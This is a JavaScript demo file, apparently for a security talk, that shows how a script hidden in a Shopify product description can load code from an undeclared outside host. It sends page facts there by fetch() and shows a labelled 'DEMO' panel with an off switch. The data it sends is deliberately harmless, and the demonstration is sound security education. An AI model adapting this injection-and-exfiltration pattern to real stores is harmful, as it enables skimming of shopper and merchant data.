/*
 * remote.js - served from guialbuk.github.io (an outside host), loaded by a <script>
 * inside a Shopify product description for an internal security talk.
 *
 * Benign and reversible. It draws a labelled panel, reads only non-sensitive page
 * facts (product handle, page type, locale, viewport), sends them to THIS host as
 * URL query parameters so the request is visible in the Network tab, reads this
 * host's reply, and offers an off switch. It never touches cookies, storage, forms,
 * or any buyer/customer data, and it sends nothing anywhere else.
 */
(function () {
  if (window.__nstRemoteStarted) { return; }
  window.__nstRemoteStarted = true;

  var HOST = 'guialbuk.github.io/nst-demo-host';
  var BASE = 'https://guialbuk.github.io/nst-demo-host';
  var VERSION = 'v1';

  var doc = document;
  var root = doc.documentElement;
  root.setAttribute('data-nstdemo-remote', 'on');

  function make(tag, css, text) {
    var el = doc.createElement(tag);
    if (css) { el.style.cssText = css; }
    if (text != null) { el.textContent = text; }
    return el;
  }

  var panel = make('div', [
    'position:fixed', 'left:16px', 'bottom:84px', 'z-index:2147483647',
    'width:380px', 'max-width:calc(100vw - 32px)', 'box-sizing:border-box',
    'font-family:ui-sans-serif,system-ui,-apple-system,sans-serif',
    'background:#0d1117', 'color:#e6edf3', 'border:1px solid #30363d',
    'border-radius:12px', 'box-shadow:0 10px 30px rgba(0,0,0,.45)', 'overflow:hidden'
  ].join(';'));
  panel.setAttribute('data-nstdemo-remote-panel', '1');

  var bar = make('div', 'display:flex;align-items:center;gap:8px;padding:10px 12px;background:#161b22;border-bottom:1px solid #30363d');
  var tag = make('span', 'background:#d29922;color:#0d1117;font-weight:700;font-size:11px;padding:2px 7px;border-radius:5px', 'DEMO');
  var barText = make('span', 'font-size:12px;color:#9aa7b8;flex:1', 'code loaded from an outside host');
  var close = make('button', 'background:#21262d;color:#e6edf3;border:1px solid #30363d;border-radius:6px;padding:4px 10px;font:inherit;font-size:12px;cursor:pointer', 'Close (Esc)');
  bar.appendChild(tag); bar.appendChild(barText); bar.appendChild(close);

  var body = make('div', 'padding:12px;font-size:13px;line-height:1.45');
  var lead = make('p', 'margin:0 0 10px');
  lead.innerHTML = 'This panel’s code is <b>not in the store</b>. A &lt;script&gt; in the product description loaded it from <b>' + HOST + '</b> — a host the store never declared, behind no app, no review and no network-access rule.';
  var ver = make('p', 'margin:0 0 10px;color:#9aa7b8;font-size:12px', 'Served version: ' + VERSION + '  (edit remote.js on the host and reload to change the code the store runs)');

  var sentTitle = make('p', 'margin:10px 0 4px;color:#9aa7b8;font-size:12px', 'It just sent these page facts to that host (no buyer data, no cookies):');
  var sentBox = make('pre', 'margin:0 0 10px;padding:8px;background:#161b22;border-left:3px solid #58a6ff;border-radius:4px;white-space:pre-wrap;word-break:break-word;font-size:12px', 'collecting...');

  var replyTitle = make('p', 'margin:10px 0 4px;color:#9aa7b8;font-size:12px', 'The host replied:');
  var replyBox = make('pre', 'margin:0 0 10px;padding:8px;background:#161b22;border-left:3px solid #3fb950;border-radius:4px;white-space:pre-wrap;word-break:break-word;font-size:12px', 'contacting ' + HOST + ' ...');

  var foot = make('p', 'margin:8px 0 0;color:#6e7681;font-size:11px', 'Open the Network tab to watch the request leave the store. Nothing sensitive was sent, and nothing was stored.');

  body.appendChild(lead); body.appendChild(ver);
  body.appendChild(sentTitle); body.appendChild(sentBox);
  body.appendChild(replyTitle); body.appendChild(replyBox);
  body.appendChild(foot);

  panel.appendChild(bar); panel.appendChild(body);

  function onReady(fn) {
    if (doc.body) { fn(); }
    else { doc.addEventListener('DOMContentLoaded', fn); }
  }

  function stop() {
    doc.removeEventListener('keydown', onKey);
    if (panel.parentNode) { panel.parentNode.removeChild(panel); }
    root.removeAttribute('data-nstdemo-remote');
    window.__nstRemoteStarted = false;
  }
  function onKey(e) { if (e.key === 'Escape') { stop(); } }
  close.addEventListener('click', stop);
  doc.addEventListener('keydown', onKey);

  onReady(function () {
    doc.body.appendChild(panel);

    var m = location.pathname.match(/\/products\/([^/?#]+)/);
    var meta = (window.ShopifyAnalytics && window.ShopifyAnalytics.meta) || {};
    var facts = {
      store: location.hostname,
      product: (m && m[1]) || '(not a product page)',
      pageType: (meta.page && meta.page.pageType) || '',
      locale: root.getAttribute('lang') || '',
      viewport: window.innerWidth + 'x' + window.innerHeight
    };
    sentBox.textContent = JSON.stringify(facts, null, 2);

    var qs = Object.keys(facts).map(function (k) {
      return encodeURIComponent(k) + '=' + encodeURIComponent(facts[k]);
    }).join('&');

    fetch(BASE + '/response.json?' + qs, { cache: 'no-store' })
      .then(function (r) { return r.json(); })
      .then(function (reply) { replyBox.textContent = JSON.stringify(reply, null, 2); })
      .catch(function () {
        replyBox.textContent = 'Request was sent to ' + HOST + ' (visible in the Network tab). The reply could not be read here, but the data still left the store.';
      });
  });
})();
